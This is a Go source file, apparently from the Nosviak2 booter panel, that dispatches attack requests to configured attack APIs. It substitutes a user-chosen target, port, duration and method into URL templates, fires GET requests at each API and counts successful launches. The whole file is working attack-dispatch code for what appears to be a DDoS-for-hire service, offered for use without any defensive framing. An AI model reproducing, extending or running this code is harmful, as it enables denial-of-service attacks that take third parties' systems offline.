package attacks

import (
	"Nosviak2/core/configs/models"
	"Nosviak2/core/sources/layouts/toml"
	"Nosviak2/core/sources/tools"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// tries to correctly launch the api request
// this will ensure its done without issues happening on reqeust
func (am *AttackModel) LaunchAPI(method *models.RequestLaunched, flags map[string]*KeyValue) error { //returns the error
	err := LaunchAttack(method, am.Commands[1], am.Commands[3], am.Commands[2], flags, am.session.User.Username) //launches the api attack
	return err                                                                                                   //returns the error properly without issues
}

// properly tries to launch the attack
// this will safely launch the attack with the fields working
func LaunchAttack(method *models.RequestLaunched, target string, port string, duration string, flags map[string]*KeyValue, user string) error {

	//allows us to configure
	//this allows for better control without issues
	client := http.Client{
		//sets the timeout duration properly
		//this will store how long we will wait before reverting into error
		Timeout: time.Duration(toml.AttacksToml.Attacks.Timeout) * tools.ResolveString(toml.AttacksToml.Attacks.Timeoutunit),
	}

	launched := 0
	//ranges through all urls inside
	//this will try to launch to each one
	for _, target_url := range method.URL {

		//stores the formatted future url
		//this will allow for better handling without issues
		var futureURL string = target_url //stored in type string properly
		//checks for path encoding properly without issues
		//this will make sure its completed without errors happening
		if method.PathEncoding { //checks for path encoding properly
			futureURL = strings.ReplaceAll(futureURL, "<<$method>>", url.QueryEscape(method.Method))
			futureURL = strings.ReplaceAll(futureURL, "<<$target>>", url.QueryEscape(target))
			futureURL = strings.ReplaceAll(futureURL, "<<$duration>>", url.QueryEscape(duration))
			futureURL = strings.ReplaceAll(futureURL, "<<$port>>", url.QueryEscape(port))

			//ranges through all of the keyvalues properly
			//this will ensure its done without any errors happening
			for system, value := range flags { //ranges through flags properly
				futureURL = strings.ReplaceAll(futureURL, "<<$kv_"+system+">>", url.QueryEscape(value.Value))
			}
		} else { //doesnt use query escapes without issues happening
			futureURL = strings.ReplaceAll(futureURL, "<<$method>>", method.Method)
			futureURL = strings.ReplaceAll(futureURL, "<<$target>>", target)
			futureURL = strings.ReplaceAll(futureURL, "<<$duration>>", duration)
			futureURL = strings.ReplaceAll(futureURL, "<<$port>>", port)

			//ranges through all of the keyvalues properly
			//this will ensure its done without any errors happening
			for system, value := range flags { //ranges through flags properly
				futureURL = strings.ReplaceAll(futureURL, "<<$kv_"+system+">>", value.Value)
			}
		}

		//creates the new request properly without issues
		//this will make sure its done without errors happening
		req, err := http.NewRequest("GET", futureURL, nil)
		if err != nil { //error handles properly
			fmt.Printf(strings.Repeat("=", 10)+" Attack Failed API %d "+strings.Repeat("=", 10)+"\r\n", launched)
			fmt.Printf("URL: %s\r\n", futureURL)
			fmt.Printf("ERROR: %s\r\n", err.Error())
			fmt.Printf("USERNAME: %s\r\n", user)
			fmt.Printf(strings.Repeat("=", 10)+" Attack Failed API %d "+strings.Repeat("=", 10)+"\r\n", launched)
			continue
		}

		//sets the custom user-agent properly
		//this will ensure its done without errors happening
		req.Header.Set("user-agent", toml.AttacksToml.Attacks.Useragent)

		//performs the reqeust properly
		//this will ensure its done without issues happening
		res, err := client.Do(req) //performs the request
		if err != nil {            //error handles properly without issues
			fmt.Printf(strings.Repeat("=", 10)+" Attack Failed API %d "+strings.Repeat("=", 10)+"\r\n", launched)
			fmt.Printf("URL: %s\r\n", futureURL)
			fmt.Printf("ERROR: %s\r\n", err.Error())
			fmt.Printf("USERNAME: %s\r\n", user)
			fmt.Printf(strings.Repeat("=", 10)+" Attack Failed API %d "+strings.Repeat("=", 10)+"\r\n", launched)
			continue
		}

		//checks if there was any errors properly
		//this will ensure its not ignored without errors happening
		if res.StatusCode != 200 { //checks the response code properly
			fmt.Printf(strings.Repeat("=", 10)+" Attack Failed API %d "+strings.Repeat("=", 10)+"\r\n", launched)
			fmt.Printf("URL: %s\r\n", futureURL)
			fmt.Printf("CODE: %d\r\n", res.StatusCode)
			fmt.Printf("USERNAME: %s\r\n", user)
			fmt.Printf(strings.Repeat("=", 10)+" Attack Failed API %d "+strings.Repeat("=", 10)+"\r\n", launched)
			continue
		}

		launched++ //attack has been launched at this point
	}

	//checks within guidelines properly
	if launched < method.MinSuccess { //compares
		return ErrMinSuccessNotMet
	}

	//ends the spinner animation properly
	//this will make sure its done without errors happening!
	return nil
}
